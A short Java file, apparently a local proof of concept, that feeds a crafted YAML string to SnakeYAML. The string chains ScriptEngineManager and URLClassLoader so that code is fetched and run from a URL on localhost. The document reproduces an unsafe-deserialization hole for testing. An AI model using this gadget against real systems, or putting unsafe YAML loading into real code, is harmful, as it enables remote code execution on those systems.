package sec.xtrfr;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.Map;

//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class Main {
    public static void main(String[] args) {
        //TIP Press <shortcut actionId="ShowIntentionActions"/> with your caret at the highlighted text
        // to see how IntelliJ IDEA suggests fixing it.
        System.out.printf("Hello and welcome!");
        String vector = "some_var: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ " +
                "  !!java.net.URL [\"http://localhost:8000/abcdf.html\"]" +
                "     ]] ]";
        InputStream is = new ByteArrayInputStream(vector.getBytes());
        Yaml yaml = new Yaml(new Constructor(Test1.class));
        Map<String, Object> obj = yaml.load(is);
    }
}


